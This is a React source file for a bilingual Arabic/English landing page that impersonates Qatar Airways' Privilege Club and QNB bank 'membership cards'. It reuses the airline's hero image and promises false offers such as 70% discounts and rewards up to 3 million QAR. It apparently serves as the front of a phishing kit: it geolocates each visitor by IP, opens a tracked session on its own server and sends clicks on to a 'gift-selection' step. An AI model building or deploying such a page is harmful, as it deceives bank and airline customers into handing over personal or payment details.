import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { nanoid } from "nanoid";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Car, Hotel, Plane, ParkingCircle, Gift, Lock, Globe, Trophy, Wallet, Crown, Check } from "lucide-react";
import Header from "@/components/Header";

const bankImages = {
  all: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/oAJHukhWMVRNiMzZ.jpg",
  qnb: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/oAJHukhWMVRNiMzZ.jpg",
};

const cards = [
  { bank: "qnb", nameAr: "العضوية الفضية", nameEn: "Silver Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/GNPJtLJsmUHfUddx.png", bgColor: "#ffffff" },
  { bank: "qnb", nameAr: "العضوية الذهبية", nameEn: "Gold Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/UJpzjPxptKCKuynJ.png", bgColor: "#ffffff" },
  { bank: "qnb", nameAr: "العضوية البلاتينية", nameEn: "Platinum Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/hQqpxtvPQfJHewTY.png", bgColor: "#ffffff" },
];

export default function Home() {
  const [, setLocation] = useLocation();
  const { language, setLanguage } = useLanguage();
  const [bankSelect, setBankSelect] = useState("all");
  const [currentSlide, setCurrentSlide] = useState(0);
  const [userCountry, setUserCountry] = useState("Qatar");
  const [selectedCard, setSelectedCard] = useState<number | null>(null);
  const createSessionMutation = trpc.submissions.createSession.useMutation();

  const isArabic = language === "ar";

  useEffect(() => {
    const fetchCountry = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        if (data.country_name) {
          setUserCountry(data.country_name);
          return;
        }
      } catch (e) {
        console.log("ipapi failed, trying backup...");
      }

      try {
        const res = await fetch("https://ipwho.is/");
        const data = await res.json();
        if (data.country) {
          setUserCountry(data.country);
        }
      } catch (e) {
        console.error("Backup country fetch failed");
      }
    };

    fetchCountry();

    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % 2);
    }, 5000);
    return () => clearInterval(timer);
  }, []);

  const startSession = async (selectedBank: string) => {
    const sessionId = nanoid();
    localStorage.setItem("sessionId", sessionId);
    localStorage.setItem("selectedBank", selectedBank);
    
    try {
      await createSessionMutation.mutateAsync({
        sessionId,
        selectedBank,
        country: userCountry,
      });
      setLocation(`/gift-selection?bank=${selectedBank}&session=${sessionId}`);
    } catch (err) {
      console.error("Session creation failed:", err);
      setLocation(`/gift-selection?bank=${selectedBank}&session=${sessionId}`);
    }
  };

  const handleCardClick = (idx: number, bank: string) => {
    setSelectedCard(idx);
    setTimeout(() => {
      startSession(bank);
    }, 800);
  };

  const filteredCards = bankSelect === "all" ? cards : cards.filter((c) => c.bank === bankSelect);

  return (
    <div dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #f4f4f4; }
        .hero-section { width: 100%; position: relative; height: 350px; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        .hero-image { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 1; }
        .hero-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.2); z-index: 2; }
        .hero-content { position: relative; z-index: 3; text-align: center; color: white; padding: 20px; max-width: 800px; }
        .hero-title { font-size: 36px; font-weight: bold; margin-bottom: 10px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
        
        .reasons-container { max-width: 1000px; margin: -40px auto 30px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); position: relative; z-index: 10; }
        .reasons-header { font-size: 22px; font-weight: bold; color: #8C0032; margin-bottom: 25px; text-align: center; }
        .reasons-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px 30px; }
        .reason-item { display: flex; align-items: center; gap: 10px; font-size: 15px; color: #444; }
        .reason-check { color: #22c55e; flex-shrink: 0; }
        .reason-footer { font-size: 12px; color: #888; margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; }

        .cards-container { display: flex; flex-direction: column; align-items: center; gap: 20px; padding: 20px; }
        .qnb-card-box { background-color: #ffffff; border-radius: 20px; padding: 25px; margin: 0 auto; text-align: center; border: 1px solid #eeeeee; width: 100%; max-width: 380px; display: flex; flex-direction: column; align-items: center; cursor: pointer; transition: all 0.3s ease; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .qnb-card-box.selected { border-color: #8C0032; border-width: 2px; box-shadow: 0 8px 25px rgba(140, 0, 50, 0.15); }
        .selection-badge { position: absolute; top: -10px; right: -10px; background: #8C0032; color: white; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); z-index: 10; }
        .card-image-qnb { width: 100%; max-width: 300px; margin-bottom: 20px; border-radius: 0; }
        .card-title-small { font-size: 18px; font-weight: bold; margin-bottom: 15px; color: #8C0032; }
        .apply-btn { background-color: #8C0032; color: #ffffff; padding: 12px 0; width: 100%; max-width: 200px; border: none; border-radius: 20px; font-size: 14px; font-weight: bold; cursor: pointer; }

        .features-section { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
        .features-title { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 20px; text-align: center; }
        .features-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
        .feature-box { background: white; padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #eee; display: flex; flex-direction: column; align-items: center; gap: 8px; }
        .feature-box svg { color: #8C0032; width: 24px; height: 24px; }
        .feature-box span { font-size: 12px; font-weight: 500; color: #555; line-height: 1.3; }
        .feature-wide { grid-column: span 3; background: linear-gradient(135deg, #8C0032 0%, #c41e5e 100%); color: white; padding: 15px; border-radius: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; font-weight: bold; font-size: 14px; }
        .feature-wide svg { color: white; }

        @media (max-width: 600px) {
          .reasons-grid { grid-template-columns: 1fr; }
          .hero-title { font-size: 24px; }
          .hero-section { height: 250px; }
          .features-grid { grid-template-columns: 1fr 1fr; }
          .feature-wide { grid-column: span 2; }
        }
      `}</style>
      <Header />
      
      <div className="hero-section">
        <img 
          src="https://www.qatarairways.com/content/dam/images/renditions/horizontal-1/campaigns/global/privilege-club/enrollment/enrollment-hero-desktop.jpg" 
          className="hero-image" 
          alt="Join Privilege Club" 
        />
        <div className="hero-overlay"></div>
        <div className="hero-content">
          <h1 className="hero-title">
            {isArabic ? "انضم إلى نادي الامتياز وابدأ بجمع نقاط أفيوس اليوم" : "Join Privilege Club to start earning Avios today"}
          </h1>
        </div>
      </div>

      <div className="reasons-container">
        <h2 className="reasons-header">
          {isArabic ? "أسباب رائعة للانضمام إلى نادي الامتياز" : "Great reasons to join Privilege Club"}
        </h2>
        <div className="reasons-grid">
          {[
            { ar: "عروض حصرية لأعضاء نادي الامتياز", en: "Exclusive member-only offers" },
            { ar: "اربح وأنفق نقاط أفيوس كما تشاء", en: "Earn & spend Avios your way" },
            { ar: "اجمع نقاط أفيوس مع عائلتك", en: "Collect Avios with your family" },
            { ar: "ساعة مجاناً من الإنترنت على متن الطائرة", en: "Complimentary onboard Wi-Fi (1 hour)" },
            { ar: "وفّر عند الدفع باستخدام cash + Avios", en: "Pay with Cash + Avios & save" },
            { ar: "تسوّق وادفع في السوق الحرة القطرية", en: "Shop & Pay at Qatar Duty Free" },
            { ar: "استمتع برحلات المكافآت والترقيات", en: "Enjoy award flights & upgrades" },
            { ar: "احصل على وزن أمتعة إضافي", en: "Get extra baggage allowance" },
            { ar: "استمتع بخدمة الصالات حول العالم*", en: "Access international lounges*" }
          ].map((item, i) => (
            <div key={i} className="reason-item">
              <Check className="reason-check" size={18} />
              <span>{isArabic ? item.ar : item.en}</span>
            </div>
          ))}
        </div>
        <p className="reason-footer">
          {isArabic ? "*يسري حصرياً على أعضاء الدرجات الفضية والذهبية والبلاتينية فقط." : "*Exclusive for Silver, Gold and Platinum membership tier."}
        </p>
      </div>

      <div className="features-section">
        <h3 className="features-title">{isArabic ? "المميزات الرئيسية للعضوية" : "Main Membership Features"}</h3>
        <div className="features-grid">
          <div className="feature-box"><Car /><span>{isArabic ? "تأجير السيارات\nخصم 70%" : "Car Rental\n70% Discount"}</span></div>
          <div className="feature-box"><Hotel /><span>{isArabic ? "حجوزات الفنادق\nخصم 70%" : "Hotel Booking\n70% Discount"}</span></div>
          <div className="feature-box"><Plane /><span>{isArabic ? "تذاكر الطيران\nخصم 70%" : "Flight Tickets\n70% Discount"}</span></div>
          <div className="feature-box"><ParkingCircle /><span>{isArabic ? "المواقف\nخصم 70%" : "Parking\n70% Discount"}</span></div>
          <div className="feature-box"><Gift /><span>{isArabic ? "عروض خاصة" : "Special Offers"}</span></div>
          <div className="feature-box"><Lock /><span>{isArabic ? "دفع آمن" : "Secure Payment"}</span></div>
          <div className="feature-wide">
            <Trophy size={20} />
            <span>{isArabic ? "جوائز سنوية تصل إلى 3 مليون ريال قطري" : "Annual Rewards Up to 3 Million QAR"}</span>
          </div>
        </div>
      </div>

      <div className="cards-container">
        {filteredCards.map((card, idx) => (
          <div 
            key={idx} 
            className={`qnb-card-box ${selectedCard === idx ? 'selected' : ''}`}
            onClick={() => handleCardClick(idx, card.bank)}
          >
            {selectedCard === idx && <div className="selection-badge">✔</div>}
            <span className="card-title-small">{isArabic ? card.nameAr : card.nameEn}</span>
            <img src={card.img} className="card-image-qnb" alt="Credit Card" />
            <button className="apply-btn">{isArabic ? "قدم الآن" : "Apply Now"}</button>
          </div>
        ))}
      </div>
      
      <div style={{ textAlign: 'center', padding: '40px 20px', backgroundColor: '#ffffff', marginTop: '40px' }}>
        <img 
          src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} 
          alt="Footer Banner" 
          style={{ maxWidth: '100%', height: 'auto' }} 
        />
      </div>
    </div>
  );
}
